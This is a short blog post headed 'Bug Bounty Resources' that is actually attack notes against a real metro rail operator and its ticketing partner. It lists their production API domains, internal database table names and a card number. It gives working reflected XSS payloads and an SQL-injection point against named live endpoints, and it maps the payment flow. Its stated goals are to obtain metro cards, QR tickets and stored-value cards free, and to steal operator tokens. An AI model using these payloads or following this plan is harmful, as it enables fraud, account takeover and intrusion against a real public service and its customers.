---
layout: post
title: Bug Bounty Resources
image: /assets/malware.jpg
tags: sqli
---

This post contains resources for bug bounty.

## SQLI

[Blind SQLI](https://youtu.be/uN8Tv1exPMk)
[Blind SQLI Manual + sqlmap](https://youtu.be/TjRK3aVEC60)

t_payment_details

account take over
sqlmap
LFI
SQLI

## Tables

`t_tc_cardtransaction` -> Card transaction table
`t_tc_registration` -> User table

## Domains

`apiprod.chennaimetrorail.org`
`rechargeapi.chennaimetrorail.org`
`mticket-api.hailmobility.in`  -> QR code stored here,  main payment here, uses JWT + JWE token to verify user
`mmjp-api.hailmobility.in`
`ticketsapi.chennaimetrorail.org`

CardNo: 1100095658

check tickets api what it does, if hail mobility is independant wtf is CMRL used for?

## XXS

```
http://rechargeapi.chennaimetrorail.org/api/ValidateCard/Getdetails?CMRLsurfacenumber=<h1>hi</h1>
```

```
https://rechargeapi.chennaimetrorail.org/api/ValidateCard/Getdetails?CMRLsurfacenumber=%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## SQLI

`https://apiprod.chennaimetrorail.org/v4/api/ValidateOTP?OTP=SQLI`

SELECT Price FROM t_tc_cardtransaction WHERE Id = 239714;

## QR Procedure

```
https://mticket-api.hailmobility.in/bookingengine/api/v1/booking/initiate


https://pgi.billdesk.com/pgidsk/PGIMerchantPayment



AFter pay

https://mticket-api.hailmobility.in/paymentengine/api/v1/payment/billdesk/update-transaction/
https://mticket-api.hailmobility.in/bookingengine/api/v1/booking/redirectonbooking?orderId=9795370&status=FAILURE&type=ticket&oldOrderId=
```

## Goal

1. Metro card free (only this stored in cmrl)
2. QR generate free (hail mobility)
3. Store value card free (hail moblity spring boot)

## Target Operators?

steal existing operator token without being logged

QRTicketController webview